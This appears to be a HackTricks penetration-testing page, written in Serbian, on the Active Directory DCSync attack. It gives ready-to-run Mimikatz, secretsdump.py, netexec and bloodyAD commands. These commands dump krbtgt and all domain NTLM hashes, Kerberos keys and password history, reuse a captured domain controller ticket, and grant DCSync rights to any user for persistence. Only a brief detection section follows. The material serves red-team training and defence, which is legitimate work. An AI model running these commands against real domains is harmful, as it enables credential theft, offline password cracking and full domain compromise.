# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** dozvola podrazumeva posedovanje sledećih dozvola nad samim domenom: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** i **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Važne napomene o DCSync:**

- **DCSync attack simulira ponašanje Domain Controller-a i zahteva od drugih Domain Controller-a da repliciraju informacije** koristeći Directory Replication Service Remote Protocol (MS-DRSR). Pošto je MS-DRSR validna i neophodna funkcija Active Directory-ja, ne može se isključiti ili onemogućiti.
- Podrazumevano, samo grupe **Domain Admins, Enterprise Admins, Administrators i Domain Controllers** imaju potrebne privilegije.
- U praksi, **full DCSync** zahteva **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** u kontekstu imenovanja domena. `DS-Replication-Get-Changes-In-Filtered-Set` se obično delegira zajedno sa njima, ali je samostalno relevantniji za sinhronizaciju **confidential / RODC-filtered attributes** (na primer, legacy LAPS-style secrets) nego za kompletan krbtgt dump.<sup>[[2]](#references)</sup>
- Ako su lozinke nekog naloga sačuvane pomoću reverzibilnog šifrovanja, u Mimikatz-u je dostupna opcija za prikaz lozinke u čistom tekstu

### Enumeracija

Proverite ko ima ove dozvole koristeći `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Ako želite da se fokusirate na **non-default principals** sa DCSync pravima, izuzmite ugrađene grupe sa mogućnošću replikacije i pregledajte samo neočekivane nosioce prava:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Exploit lokalno
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Exploit Udaljeno
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Praktični primeri sa ograničenim opsegom:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync korišćenjem uhvaćenog DC machine TGT-a (ccache)

U scenarijima `unconstrained-delegation export-mode`, možete uhvatiti TGT mašine Domain Controller-a (npr. `DC1$@DOMAIN` za `krbtgt@DOMAIN`). Zatim možete koristiti taj ccache za autentifikaciju kao DC i izvršiti DCSync bez lozinke.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Operativne napomene:

- **Impacket's Kerberos path touches SMB first** pre poziva DRSUAPI. Ako okruženje primenjuje **SPN target name validation**, full dump može da ne uspe uz poruku `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- U tom slučaju prvo zatražite **`cifs/<dc>`** service ticket za ciljni DC ili koristite **`-just-dc-user`** za nalog koji vam je odmah potreban.
- Kada imate samo niža prava replikacije, LDAP/DirSync-style syncing i dalje može da otkrije **confidential** ili **RODC-filtered** atribute (na primer nasleđeni `ms-Mcs-AdmPwd`) bez potpune krbtgt replikacije.<sup>[[2]](#references)</sup>

`-just-dc` generiše 3 fajla:

- jedan sa **NTLM hashes**
- jedan sa **Kerberos keys**
- jedan sa lozinkama u čistom tekstu iz NTDS-a za sve naloge kod kojih je omogućena opcija [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Korisnike sa uključenom reversible encryption možete dobiti pomoću

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Perzistencija

Ako ste domain admin, ove dozvole možete dodeliti bilo kom korisniku pomoću PowerView-a:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Linux operateri mogu isto da urade pomoću `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Zatim možete **proveriti da li su korisniku ispravno dodeljene** 3 privilegije tako što ćete ih potražiti u izlazu komande (trebalo bi da vidite nazive privilegija u polju „ObjectType“):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mere ublažavanja

- Security Event ID 4662 (Audit Policy for object must be enabled) – Operacija je izvršena nad objektom<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Audit Policy for object must be enabled) – Izmenjen je directory service objekat
- Security Event ID 4670 (Audit Policy for object must be enabled) – Promenjene su dozvole nad objektom
- AD ACL Scanner - Kreirajte i uporedite izveštaje o ACL-ovima. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Impacket Dnevnik promena](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Iskorišćavanje Replication Get-Changes i Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Preuzimanje Password Hashes sa Domain Controller-a](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync do DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
